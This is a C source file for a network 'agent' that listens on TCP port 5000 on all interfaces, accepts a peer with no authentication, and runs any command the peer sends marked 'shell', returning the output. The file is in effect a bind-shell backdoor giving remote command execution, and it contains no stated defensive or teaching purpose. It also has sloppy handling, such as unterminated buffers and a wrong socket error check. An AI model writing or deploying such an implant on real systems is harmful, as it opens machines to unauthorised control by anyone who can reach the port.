#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>

#include "shell.h"

#define PORT 5000
#define CMD_TYPE_BUFSIZE 128

enum CommandType
{
    SHELL
};

int start_server()
{
    int server_fd;
    struct sockaddr_in address = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = INADDR_ANY,
        .sin_port = htons(PORT)};

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("Failed to create a socket.");
        exit(EXIT_FAILURE);
    }

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        perror("Failed to bind a socket.");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0)
    {
        perror("Failed to listen on the socket.");
        exit(EXIT_FAILURE);
    }
    return server_fd;
}

void start_agent()
{
    puts("Starting the agent.");
    char cmd_type[CMD_TYPE_BUFSIZE];
    int peer_fd;
    int server_fd = start_server();
    memset(cmd_type, 0, sizeof(cmd_type));
    puts("Accepting a peer.");
    if ((peer_fd = accept(server_fd, (struct sockaddr *)NULL, NULL)) < 0)
    {
        perror("Failed to accept the peer.");
        exit(EXIT_FAILURE);
    }
    while (1)
    {
        puts("Reading from peer.");
        if (read(peer_fd, cmd_type, sizeof(cmd_type)) < 0)
        {
            perror("Failed to read from the peer.");
            exit(EXIT_FAILURE);
        }
        printf("Command type: %s\n", cmd_type);
        if (!strcmp(cmd_type, "shell"))
        {
            char output[SHELL_OUTPUT_BUFSIZE] = {};
            char cmd[SHELL_CMD_BUFSIZE] = {};
            puts("Command type is Shell.");

            puts("Reading the command from peer.");
            if (read(peer_fd, cmd, sizeof(cmd)) < 0)
            {
                perror("Failed to read the command from peer.");
                exit(EXIT_FAILURE);
            }
            shell(cmd, output);
            puts("Sending the command output to the peer.");
            if (write(peer_fd, output, sizeof(output)) < 0)
            {
                perror("Failed to write to the socket.");
                exit(EXIT_FAILURE);
            }
        }
    }
    close(peer_fd);
}